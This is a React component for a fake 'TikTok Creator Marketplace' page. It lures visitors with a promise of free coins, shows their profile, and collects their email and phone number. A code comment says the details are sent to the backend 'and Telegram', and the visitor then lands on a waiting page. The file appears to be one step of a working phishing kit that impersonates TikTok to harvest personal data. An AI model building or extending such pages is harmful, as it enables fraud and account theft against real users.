import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Smartphone } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const ContactPage = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [countryCode, setCountryCode] = useState('+1');
  const [isEmailValid, setIsEmailValid] = useState(false);
  const [tiktokData, setTiktokData] = useState(null);
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';
  const sessionId = localStorage.getItem('sessionId');
  const username = localStorage.getItem('username');

  useEffect(() => {
    // Load TikTok data from localStorage
    const storedData = localStorage.getItem('tiktokData');
    if (storedData) {
      setTiktokData(JSON.parse(storedData));
    }
  }, []);

  // Email validation function
  const validateEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleEmailChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    setIsEmailValid(validateEmail(value));
  };

  const handleSubmit = async () => {
    if (email.trim() && phone.trim() && isEmailValid) {
      const fullPhone = `${countryCode}${phone}`;
      localStorage.setItem('email', email);
      localStorage.setItem('phone', fullPhone);

      // Send to backend and Telegram
      try {
        await axios.post(`${API}/session/step`, {
          session_id: sessionId,
          step: 'contact',
          data: {
            username: username,
            amount: parseInt(coinAmount),
            email: email,
            phone: fullPhone
          }
        });
      } catch (error) {
        console.error('Failed to submit step:', error);
      }

      // Navigate to waiting page
      navigate('/waiting');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-6">
        {/* Title */}
        <div className="text-center mb-6">
          <h1 className="text-4xl font-black mb-2">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-lg font-semibold">Your Contact Information</p>
        </div>

        {/* Profile Card Container */}
        <div className="w-[400px] h-[120px] mx-auto mb-8 border border-cyan-400/30 rounded-2xl shadow-[0_0_20px_rgba(34,211,238,0.2)] bg-[#0f0f10] flex p-3 gap-3 overflow-hidden">
          {tiktokData ? (
            <>
              {/* Profil Fotoğrafı (Sol) */}
              <img src={tiktokData.avatar} alt="Profile" className="w-16 h-16 rounded-full border border-cyan-400 object-cover mt-0.5" />
              
              {/* Sağ Bilgi Alanı */}
              <div className="flex flex-col flex-1 h-full justify-between py-1">
                {/* İsim (Beyaz/Kalın) ve Kullanıcı Adı (Mavi/@ ile) */}
                <div className="flex flex-col leading-tight">
                  <h2 className="text-white font-bold text-lg">{tiktokData.name}</h2>
                  <span className="text-cyan-400 text-sm font-medium mt-0.5">@{tiktokData.username}</span>
                </div>
                
                {/* İstatistikler (Alt) */}
                <div className="flex justify-between w-full pr-4 pb-0.5">
                  <div className="flex flex-col items-center">
                    <span className="text-white font-bold text-sm">{tiktokData.followers}</span>
                    <span className="text-gray-500 text-[9px] uppercase tracking-wider">Followers</span>
                  </div>
                  <div className="flex flex-col items-center">
                    <span className="text-white font-bold text-sm">{tiktokData.following}</span>
                    <span className="text-gray-500 text-[9px] uppercase tracking-wider">Following</span>
                  </div>
                  <div className="flex flex-col items-center">
                    <span className="text-white font-bold text-sm">{tiktokData.likes}</span>
                    <span className="text-gray-500 text-[9px] uppercase tracking-wider">Likes</span>
                  </div>
                </div>
              </div>
            </>
          ) : (
            <p className="text-gray-400 text-sm text-center w-full flex items-center justify-center">Loading profile...</p>
          )}
        </div>

        {/* Instructions */}
        <p className="text-gray-400 text-center text-base mb-7">
          Please provide your email and phone number for further verification.
        </p>

        {/* Email Input */}
        <div className="mb-5">
          <label className="text-white text-base mb-2 block">Email Address</label>
          <div className="relative">
            <Input
              type="email"
              placeholder="example@email.com"
              value={email}
              onChange={handleEmailChange}
              className={`w-full bg-[#1a1a1c] border-2 text-white placeholder:text-gray-500 px-4 py-5 text-lg rounded-lg focus:ring-1 pr-12 transition-all ${
                email && isEmailValid 
                  ? 'border-green-500 focus:border-green-500 focus:ring-green-500' 
                  : email && !isEmailValid
                  ? 'border-red-500 focus:border-red-500 focus:ring-red-500'
                  : 'border-gray-700 focus:border-cyan-400 focus:ring-cyan-400'
              }`}
            />
            {email && isEmailValid && (
              <div className="absolute right-4 top-1/2 -translate-y-1/2">
                <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center animate-pulse">
                  <span className="text-white text-sm font-bold">✓</span>
                </div>
              </div>
            )}
            {email && !isEmailValid && (
              <div className="absolute right-4 top-1/2 -translate-y-1/2">
                <div className="w-6 h-6 rounded-full bg-red-500 flex items-center justify-center">
                  <span className="text-white text-sm font-bold">✗</span>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Phone Input */}
        <div className="mb-6">
          <label className="text-white text-base mb-2 block">Phone Number</label>
          <div className="flex gap-3">
            <select
              value={countryCode}
              onChange={(e) => setCountryCode(e.target.value)}
              className="bg-[#1a1a1c] border border-gray-700 text-white px-3 py-5 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
            >
              <option value="+1">+1</option>
              <option value="+44">+44</option>
              <option value="+49">+49</option>
              <option value="+33">+33</option>
              <option value="+90">+90</option>
              <option value="+7">+7</option>
              <option value="+61">+61</option>
              <option value="+81">+81</option>
              <option value="+34">+34</option>
              <option value="+39">+39</option>
              <option value="+55">+55</option>
              <option value="+91">+91</option>
              <option value="+86">+86</option>
              <option value="+82">+82</option>
              <option value="+62">+62</option>
              <option value="+351">+351</option>
              <option value="+46">+46</option>
              <option value="+31">+31</option>
              <option value="+32">+32</option>
              <option value="+380">+380</option>
              <option value="+48">+48</option>
              <option value="+420">+420</option>
              <option value="+36">+36</option>
              <option value="+40">+40</option>
              <option value="+20">+20</option>
              <option value="+966">+966</option>
              <option value="+971">+971</option>
              <option value="+973">+972</option>
              <option value="+63">+63</option>
              <option value="+234">+234</option>
              <option value="+27">+27</option>
              <option value="+66">+66</option>
              <option value="+886">+886</option>
              <option value="+998">+998</option>
              <option value="+994">+994</option>
              <option value="+373">+373</option>
              <option value="+995">+995</option>
            </select>
            <Input
              type="tel"
              placeholder="+1 xxx xxx xxxx"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="flex-1 bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-5 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
            />
          </div>
        </div>

        {/* Submit Button */}
        <Button
          onClick={handleSubmit}
          disabled={!email.trim() || !phone.trim() || !isEmailValid}
          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f73157] hover:to-[#f73157] text-gray-400 hover:text-white font-semibold py-5 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Continue
        </Button>

        {/* Coins Display */}
        <div className="mt-6 text-center">
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-6 py-3">
            <span className="text-gray-400 text-base">You will receive: </span>
            <span className="text-cyan-400 text-xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-base"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default ContactPage;
